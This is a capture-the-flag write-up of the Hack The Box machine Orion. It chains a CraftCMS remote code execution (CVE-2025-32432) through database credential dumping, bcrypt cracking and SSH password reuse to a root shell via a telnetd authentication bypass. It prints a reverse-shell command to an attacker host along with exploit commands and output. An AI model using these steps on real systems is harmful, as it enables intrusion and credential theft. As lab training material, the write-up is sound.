---
title: "HTB Orion: CraftCMS RCE to Telnet Privilege Escalation"

date: 2026-08-05 16:00:00 +0500

categories:
  - HTB
  - Linux
  - Easy

tags:
  - htb-linux-easy
  - htb
  - linux
  - craftcms
  - web-exploitation
  - rce
  - credential-exposure
  - bcrypt
  - password-cracking
  - telnet
  - privilege-escalation
  - cve-2025-32432
  - cve-2026-24061

description: Detailed HTB Orion writeup. Exploit CraftCMS RCE (CVE-2025-32432), harvest database credentials, crack bcrypt hashes, and escalate to root via Telnet.

image:
  path: /assets/img/writeups/orion/banner.png
  alt: HTB Orion Writeup

mermaid: true
---


## 1. Machine Information

| Machine | Orion |
|---------|-------|
| Platform | [HackTheBox](https://www.hackthebox.com/) |
| OS | Linux |
| Difficulty | Easy |
| Initial Access | CraftCMS RCE (CVE-2025-32432) |
| Privilege Escalation | Telnet Authentication Bypass (CVE-2026-24061) |

## 2. Attack Path

```
CraftCMS RCE (CVE-2025-32432)
      ↓
Environment Variable Disclosure
      ↓
Database Credential Extraction
      ↓
Password Cracking
      ↓
SSH Access (adam)
      ↓
Telnet Authentication Bypass (CVE-2026-24061)
      ↓
Root Access
```

## 3. Overview

**Orion** is an easy-difficulty Linux machine on **Hack The Box** that demonstrates real-world web application exploitation, database credential dumping, and service-based privilege escalation. 

The initial foothold is achieved by exploiting a Remote Code Execution (RCE) vulnerability in **CraftCMS** (**CVE-2025-32432**). Inspecting the application environment variables exposes database credentials, allowing extraction and offline cracking of `bcrypt` password hashes. After obtaining user SSH access as `adam`, root administrative access is obtained by exploiting a Telnet authentication bypass vulnerability (**CVE-2026-24061**).

## 4. Reconnaissance

Initial Nmap scan revealed two open services:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0
```

The web server redirected to: `http://orion.htb/`

After adding the hostname to `/etc/hosts`, directory enumeration was performed.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \ -u http://orion.htb/FUZZ
```

The enumeration revealed an administrative endpoint: `/admin`

> **Key Findings**
>
> - HTTP service running on port 80
> - SSH available on port 22
> - Web application: CraftCMS
> - Target hostname: orion.htb
{: .prompt-info }

## 5. CraftCMS Enumeration

The discovered `/admin` endpoint exposed the CraftCMS administrative login interface.

![CraftCMS Admin Login Page](/assets/img/writeups/orion/admin-login-page.png)
_CraftCMS administrative interface exposed at `/admin`, revealing the application technology and version._

The admin page revealed the application was running: `CraftCMS 5.6.1`

Searching for known vulnerabilities identified: `CVE-2025-32432 - CraftCMS Remote Code Execution`

The vulnerability affects CraftCMS versions due to insecure handling of asset transform requests, allowing unauthenticated remote code execution.

## 6. Initial Shell

### i. Exploit Development

A public Proof-of-Concept (PoC) was available on GitHub:

> Repository:
> [CVE-2025-32432-POC](https://github.com/theeomega/CVE-2025-32432-POC)
{: .prompt-info }

The exploit automates:
- CSRF token extraction
- vulnerable asset transform request generation
- PHP session poisoning
- command execution

```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/machines/orion/CVE-2025-32432-POC]
└─$ python3 exploit.py \                           
  -u http://orion.htb \  
  -c "bash -lc 'setsid bash -c \"bash -i >& /dev/tcp/[IP]/4444 0>&1\" >/dev/null 2>&1 &'" \
  --timeout 0
[*] Target: http://orion.htb
[*] Front controller: index.php
[+] CSRF token found via http://orion.htb/index.php?p=admin/dashboard
[*] Testing endpoint: http://orion.htb/index.php?p=admin/actions/assets/generate-transform
    assetId 0 -> HTTP 200
[+] phpinfo triggered
[+] Working endpoint: http://orion.htb/index.php?p=admin/actions/assets/generate-transform
[+] Working assetId: 0
[+] Saved phpinfo_success.html
[+] Vulnerability confirmed by phpinfo gadget
[*] Poisoning session with PHP command payload
[*] Session poison HTTP status: 200
[+] Session ID: k5sa334204oop82h58u4m4udss
[+] CSRF token: IL4DRlR4m13ysE2O-zg7IgGre0zcRqnsXd8uqHoUFWshQIwkGQzr91HGUysMLckKx9EkwKRnTxtvnjAhpj79jmm0H5gIRUQsbR_KcWFvu5k=
[*] Trying session file: /var/lib/php/sessions/sess_k5sa334204oop82h58u4m4udss
[*] Trigger HTTP status: 200
[+] Command output:
```

The exploit executed successfully, allowing me to catch a reverse shell on my listener.

```bash
www-data@orion:~/html/craft/web$ cd ..
```

With initial access established, I began enumerating the application environment. By inspecting the system's active environment variables, I discovered cleartext database credentials.

```bash
www-data@orion:~/html/craft/config$ env
CRAFT_ENVIRONMENT=dev
CRAFT_DB_PORT=3306
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
PWD=/var/www/html/craft/config
PRIMARY_SITE_URL=http://orion.htb/
CRAFT_DB_DATABASE=orion
HOME=/var/www
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
TERM=xterm
USER=www-data
SHLVL=3
CRAFT_DB_USER=root
LC_CTYPE=C.UTF-8
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DB_SCHEMA=
OLDPWD=/var/www/html/craft
```

> **Sensitive Information Disclosure**
>
> The CraftCMS configuration exposed database credentials through environment variables:
>
> ```
> Username: root
> Password: SuperSecureCraft123Pass!
> Database: orion
> ```
{: .prompt-warning }

## 7. Extracting User Credentials

With the database credentials (root:SuperSecureCraft123Pass!) recovered from the environment variables, the next step was to access the local MariaDB instance to look for user accounts and password hashes.

### i. Database Enumeration

I authenticated to the database locally and listed the available databases to find the main application data store:
```bash
www-data@orion:~$ mysql -u root -p'SuperSecureCraft123Pass!'
```

```plaintext
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| mysql              |
| orion              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.002 sec)
```

The database named `orion` was the clear target. After switching to this database, I listed the tables to locate the user management data

```plaintext
MariaDB [(none)]> use orion;
Database changed

MariaDB [orion]> show tables;
+----------------------------+

| Tables_in_orion            |
+----------------------------+

| addresses                  |
| announcements              |
...

| users                      |
| volumefolders              |
+----------------------------+
66 rows in set (0.000 sec)
```

### ii. User Hash Extraction

I queried the users table to extract accounts credentials.

```plaintext
MariaDB [orion]> SELECT * from user;
ERROR 1146 (42S02): Table 'orion.user' doesn't exist

MariaDB [orion]> SELECT username, email, password FROM users;
+----------+----------------+--------------------------------------------------------------+

| username | email          | password                                                     |
+----------+----------------+--------------------------------------------------------------+

| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----------+----------------+--------------------------------------------------------------+
1 row in set (0.000 sec)
```

### iii. Password Recovery

To identify the encryption type used on the string, I ran the hash through hashid. The tool identified it as a bcrypt / Blowfish algorithm, which corresponds to Hashcat mode 3200.

```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/machines/orion/CVE-2025-32432-POC]
└─$ hashid -m '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'                              

Analyzing '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```

Using Hashcat along with the standard rockyou.txt wordlist, I initiated a brute-force attack against the hash. Because bcrypt uses a high work factor ($13$), it took a bit of time, but successfully cracked to reveal the cleartext password: darkangel.

```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/machines/orion/CVE-2025-32432-POC]
└─$ hashcat -m 3200 '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' ~/Desktop/rockyou.txt

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```
> **Credential Recovery**
>
> The bcrypt hash was successfully cracked using a dictionary attack, revealing valid application credentials:
>
> ```
> Username: adam
> Password: darkangel
> ```
>
> The recovered password was reused for SSH authentication, allowing access as user `adam`.
{: .prompt-warning }

### iv. SSH Authentication

The email address in the database suggested the infrastructure user might be named adam. Assuming password reuse between the CMS panel database record and the operating system level, I attempted to connect via SSH.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh adam@orion.htb
adam@orion.htb's password: darkangel

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)
adam@orion:~$
```
The credentials worked perfectly. I established a stable, interactive system shell as user adam and read the user flag located in the home directory.

```bash
adam@orion:~$ cat user.txt 
<REDACTED>
```

## 8. Privilege Escalation

### i. Local Service Enumeration

After gaining SSH access as adam, I audited the network sockets listening on the system to look for internal services. Running ss -tlnp revealed a network service bound exclusively to the local loopback interface (127.0.0.1) on port 23.

```bash
adam@orion:~$ ss -tlnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process                  
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*                                              
LISTEN                   0                        511                                              0.0.0.0:80                                            0.0.0.0:*                                              
LISTEN                   0                        80                                             127.0.0.1:3306                                          0.0.0.0:*                                              
LISTEN                   0                        10                                             127.0.0.1:23                                            0.0.0.0:*                                              
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*                                              
LISTEN                   0                        128                                                 [::]:22                                               [::]:*  

```

Port 23 is conventionally assigned to Telnet. To verify how this service was managed, I inspected the internet services daemon configuration file (/etc/inetd.conf).

```bash
adam@orion:~$ cat /etc/inetd.conf
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```
The configuration confirmed that incoming connections to 127.0.0.1:23 spawn a Telnet daemon (telnetd) running with root privileges.

> **Interesting Service Discovery**
>
> Port `23` was not exposed externally but was listening locally. This indicated a potentially privileged internal service accessible after obtaining user access.
{: .prompt-info }

### ii. Vulnerability Identification

Next, I checked the software version of the binary located at /usr/local/sbin/telnetd:

```bash
adam@orion:~$ /usr/local/sbin/telnetd --version
telnetd (GNU inetutils) 2.7
```


The Telnet daemon was running GNU inetutils version 2.7.

This version is affected by **CVE-2026-24061**, which allows authentication bypass through improper Telnet option handling, resulting in unauthenticated root access.


![Telnet 2.7 CVE](/assets/img/writeups/orion/telnet-2.7-cve.png)
_GNU inetutils telnetd version 2.7 identified as vulnerable to CVE-2026-24061._

A search via Google for a public exploit vector led me to a Proof-of-Concept repository hosted on GitHub: [CVE-2026-24061 by K3ysTr0K3R](https://github.com/K3ysTr0K3R/CVE-2026-24061).

### iii. Exploitation & Root Access

Because port `23` is restricted to localhost connections, I established an SSH local port forward from my local attack machine. This mapped port `23` on my local loopback interface directly to port `23` on the target machine through the existing SSH session:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -L 23:127.0.0.1:23 adam@orion.htb
```

With the port successfully forwarded, I executed the cloned CVE-2026-24061.py exploit script against my local end of the tunnel to handle the Telnet protocol negotiations and automatically inject the malicious option payload:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2026-24061.py 127.0.0.1 -p 23
```

The script successfully completed the malicious protocol negotiation, bypassed the login sequence, and dropped me directly into an interactive, bidirectional root terminal shell.

```bash
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)

root@orion:~# cat /root/root.txt
<REDACTED>
```

The target machine was fully compromised.

## 9. Conclusion

Orion demonstrated a complete attack chain:

- Information disclosure through application configuration files
- Exploitation of a vulnerable CraftCMS installation
- Credential recovery from the database
- Password cracking with bcrypt
- Local privilege escalation through a vulnerable Telnet service

>The main lesson from this machine is the importance of keeping web applications and exposed services updated, as a single outdated component can lead to full system compromise.
{: .prompt-tip }